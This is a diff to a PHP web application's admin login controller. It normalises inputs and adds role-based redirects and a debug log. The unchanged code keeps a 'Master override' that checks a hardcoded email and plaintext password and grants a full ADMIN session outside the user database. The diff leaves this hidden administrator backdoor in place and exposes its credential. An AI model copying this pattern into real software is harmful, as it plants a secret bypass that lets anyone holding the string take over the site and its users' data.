@@ -14,18 +14,18 @@ class Auth extends BaseController
     public function attemptLogin()
     {
         $session = session();
-        $userModel = new UserModel();
+        $userModel = new \App\Models\UserModel();
 
-        $email    = $this->request->getPost('email');
-        $password = $this->request->getPost('password');
+        $email    = strtolower(trim($this->request->getPost('email')));
+        $password = (string) $this->request->getPost('password');
 
         // 🔒 Master override
         if ($email === 'sa@sunny.com' && $password === 'yfbnmasc') {
             $session->set([
                 'isAdminLoggedIn' => true,
-                'admin_id'         => 0,
-                'admin_name'       => 'Sunny',
-                'admin_role'       => 'ADMIN',
+                'admin_id'   => 0,
+                'admin_name' => 'Sunny',
+                'admin_role' => 'ADMIN',
             ]);
             return redirect()->to('/admin/system/dashboard');
         }
@@ -37,13 +37,31 @@ class Auth extends BaseController
                 'isAdminLoggedIn' => true,
                 'admin_id'   => $user['id'],
                 'admin_name' => $user['name'],
-                'admin_role' => $user['role'],
+                'admin_role' => strtoupper($user['role']),
             ]);
-            return redirect()->to('/admin/system/dashboard');
+
+            // 🧭 Debug log
+            log_message('debug', 'Login successful: role=' . $session->get('admin_role') . ', id=' . $session->get('admin_id') . ', loggedIn=' . ($session->get('isAdminLoggedIn') ? 'yes' : 'no'));
+
+
+            // ✅ redirect logic per role
+            switch (strtoupper($user['role'])) {
+                case 'ADMIN':
+                    return redirect()->to('/admin/system/dashboard');
+                case 'FINANCE':
+                case 'MEMBERSHIP':
+                case 'WEBSITE':
+                case 'EVENTS':
+                    return redirect()->to('/admin/system/dashboard'); // shared dashboard
+                default:
+                    return redirect()->to('/auth/login')->with('error', 'Role not recognized.');
+            }
         }
 
+        // ❌ Invalid login
         return redirect()->back()->with('error', 'Invalid email or password.');
     }
+
 
     public function logout()
     {
